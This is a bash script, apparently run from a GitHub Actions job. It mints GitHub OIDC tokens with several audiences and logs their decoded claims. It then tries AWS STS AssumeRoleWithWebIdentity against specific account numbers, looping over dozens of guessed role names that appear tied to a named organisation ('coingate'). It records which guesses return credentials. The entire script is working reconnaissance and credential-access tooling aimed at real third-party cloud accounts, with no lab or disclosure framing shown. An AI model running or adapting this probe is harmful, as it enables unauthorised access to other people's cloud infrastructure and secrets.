#!/bin/bash
set -u
STS=https://sts.amazonaws.com/
log() { echo "$*"; }

b64d() { python3 -c 'import sys,base64,json
s=sys.argv[1].split(".")[1]; s+="="*(-len(s)%4)
print(json.dumps(json.loads(base64.urlsafe_b64decode(s)),ensure_ascii=False))' "$1"; }

mint() {
  curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" \
    "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=$1" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))'
}

assume() { # token acct role label
  local r t h b code msg
  t=$1; local acct=$2; local role=$3; local label=$4
  r=$(curl -sS -m 20 -w '\nHTTP:%{http_code}' "$STS" \
    --data-urlencode "Action=AssumeRoleWithWebIdentity" \
    --data-urlencode "Version=2011-06-15" \
    --data-urlencode "RoleArn=arn:aws:iam::${acct}:role/${role}" \
    --data-urlencode "RoleSessionName=oidcprobe" \
    --data-urlencode "WebIdentityToken=$t")
  h=$(printf '%s' "$r" | tail -1 | sed 's/HTTP://')
  b=$(printf '%s' "$r" | sed '$d' | tr -d '\n')
  code=$(printf '%s' "$b" | sed -n 's:.*<Code>\([^<]*\)</Code>.*:\1:p' | head -1)
  msg=$(printf '%s' "$b" | sed -n 's:.*<Message>\([^<]*\)</Message>.*:\1:p' | head -1)
  [ -z "$code" ] && printf '%s' "$b" | grep -q '<AccessKeyId>' && code=OK
  log "R $label acct=$acct role=$role http=$h code=${code:-none} msg=${msg:-none}"
  sleep 0.5
}

TDEF=$(mint sts.amazonaws.com)
log "jwt_len=${#TDEF} ref=${GITHUB_REF:-?} event=${GITHUB_EVENT_NAME:-?} repo=${GITHUB_REPOSITORY:-?}"
log "claims_default=$(b64d "$TDEF")"

# account-scope discriminator: role in an AWS-invalid account 111111111111
assume "$TDEF" 111111111111 "zzq-nonexistent-probe-280572" "CTRL-111"
assume "$TDEF" 533852667875 "zzq-nonexistent-probe-280572" "CTRL-533"

ROLES="
cg-testas-github-actions-role-prod
cg-testas-github-actions-role
cg-testas-github-role
cg-testas-ci
cg-core-github-actions-role-prod
cg-core-github-role
cg-core-github-oidc
cg-github-actions-role-prod
cg-github-oidc-role-prod
cg-github-oidc-role
cg-github-actions-oidc-role
GitHubOIDCRole
GitHubActionsOIDCRole
GitHubActionsDeployRole
gha-oidc-role
cg-sandbox-github-actions-oidc-role
cg-sandbox-deploy
cg-origin-github-oidc-role
"
n=0
for role in $ROLES; do n=$((n+1)); assume "$TDEF" 533852667875 "$role" "S$n"; done
log "sweep_done roles=$n"

########################################################################
# Phase 2 (i280790): real-ARN aud matrix on 602675409103 + 30 new names
########################################################################
A_STS=$(mint sts.amazonaws.com)
A_GHC=$(mint https://github.com/coingate)
A_GHB=$(mint https://github.com/balwaan-tech)
A_SIG=$(mint sigstore)
log "phase2_aud_token_lens sts=${#A_STS} ghcoingate=${#A_GHC} ghbalwaan=${#A_GHB} sigstore=${#A_SIG}"
log "claims_ghcoingate=$(b64d "$A_GHC")"

# 602675409103: the only two REAL role ARNs we know (IaC-confirmed, trust=ecs-tasks Service only)
assume "$A_STS" 602675409103 "cg-testas-ecs-tasks-role-prod" "P2-602-real-aud-sts"
assume "$A_GHC" 602675409103 "cg-testas-ecs-tasks-role-prod" "P2-602-real-aud-ghcoingate"
assume "$A_GHB" 602675409103 "cg-testas-ecs-tasks-role-prod" "P2-602-real-aud-ghbalwaan"
assume "$A_SIG" 602675409103 "cg-testas-ecs-tasks-role-prod" "P2-602-real-aud-sigstore"
assume "$A_STS" 602675409103 "cg-testas-ecs-tasks-execution-role-prod" "P2-602-real2-aud-sts"

ROLES2="
cg-oidc-role
cg-github-oidc
cg-core-github-oidc-role
cg-core-gha-role
cg-core-ci-role
cg-core-cicd-role
cg-core-deploy-role
cg-core-gitops-role
cg-infra-ci-role
cg-infra-deploy-role
cg-infra-github-oidc-role
cg-sandbox-gha-role
cg-sandbox-github-actions
cg-sandbox-deploy-role
github-oidc-deploy
github-actions-deploy-role
gha-oidc
gha-deploy
cg-ecs-deploy-role
coingate-github-actions-role
coingate-github-oidc
cg-docker-github-oidc
cg-ops-oidc-role
cg-devops-oidc-role
cg/github-actions
cg-core/github-oidc
deploy/github-actions
ci/github-oidc
cg/github-oidc-role
github/deploy-role
"
n=0
for role in $ROLES2; do n=$((n+1)); assume "$TDEF" 533852667875 "$role" "P2-S$n"; done
log "phase2_done roles=$n"
